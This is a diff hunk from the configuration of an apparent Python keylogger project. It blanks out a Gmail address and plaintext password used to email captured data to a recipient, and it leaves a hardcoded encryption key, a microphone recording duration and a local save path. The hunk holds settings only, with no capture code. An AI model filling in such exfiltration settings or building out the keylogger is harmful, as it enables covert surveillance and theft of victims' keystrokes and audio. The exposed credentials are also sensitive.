@@ -47,16 +47,16 @@ microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "jainhacking913@gmail.com" # Enter disposable email here
-password = "sandesh13@" # Enter email password here
+email_address = "" # Enter disposable email here
+password = "" # Enter email password here
 
 username = getpass.getuser()
 
-toaddr = "jainhacking913@gmail.com" # Enter the email address you want to send your information to
+toaddr = "" # Enter the email address you want to send your information to
 
 key = "C0DcvpYhOHDzR4ybk5S8fYIjf7axzR6gxWP5ervjXGo=" # Generate an encryption key from the Cryptography folder
 
-file_path = "C://Users//SANDESH//Desktop//forensics//python-advanced-keylogger-crash-course-master" # Enter the file path you want your files to be saved to
+file_path = "C://Users//SANDESH//Desktop//forensics" # Enter the file path you want your files to be saved to
 extend = "//"
 file_merge = file_path + extend
 
